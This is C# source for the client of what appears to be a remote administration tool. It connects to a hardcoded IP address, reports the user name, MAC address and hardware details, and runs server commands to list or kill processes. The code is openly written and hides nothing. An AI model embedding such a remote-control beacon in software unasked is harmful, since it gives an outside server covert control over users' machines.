using Newtonsoft.Json;
using Quobject.SocketIoClientDotNet.Client;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    class Program
    {
        public static Socket socket;

        static void Main(string[] args)
        {
            socket = IO.Socket("http://145.239.82.140:6777", new IO.Options
            {
                ExtraHeaders = new Dictionary<string, string>
                {
                    ["Is-Client"] = "true",
                    ["Name"] = Environment.UserName,
                    ["MAC"] = SystemInfo.Instance.FindMac(),
                    ["Processor-Info"] = SystemInfo.Instance.Hardware.ProccesorInfo,
                    ["Memory"] = SystemInfo.Instance.Hardware.Memory,
                    ["OS"] = SystemInfo.Instance.Hardware.OSInfo,
                }
            });

            socket.On("processes", (data) => OnProcessesRequest(data));
            socket.On("kill_process", (data) => OnKillProcessRequest(data));

            Console.ReadKey();
        }

        private static void OnProcessesRequest(object data)
        {
            var obj = JsonConvert.DeserializeAnonymousType(data.ToString(), new { CallbackAdminId = "" });

            var list = new List<Process>();

            try
            {
                list = Engine.ListProcesses();
            }
            catch (Exception e)
            {
                Log(obj.CallbackAdminId, e.Message, e.TargetSite == null ? null : e.TargetSite.Name);
                return;
            }

            list = list.OrderByDescending(o => o.WorkingSet64).ToList();

            lock (socket)
            {
                socket.Emit("processes", JsonConvert.SerializeObject(new
                {
                    List = list,
                    CallbackAdminId = obj.CallbackAdminId
                }));
            }
        }

        private static void OnKillProcessRequest(object data)
        {
            var obj = JsonConvert.DeserializeAnonymousType(data.ToString(), new { processId = 0, CallbackAdminId = "" });

            try
            {
                Engine.KillProcess(obj.processId);
            }
            catch (Exception e)
            {
                Log(obj.CallbackAdminId, e.Message, e.TargetSite == null ? null : e.TargetSite.Name);
                return;
            }
        }

        private static void Log(string adminId, string message, string title)
        {
            lock (socket)
            {
                socket.Emit("log", JsonConvert.SerializeObject(new
                {
                    Message = message,
                    Title = title,
                    CallbackAdminId = adminId
                }));
            }
        }
    }
}
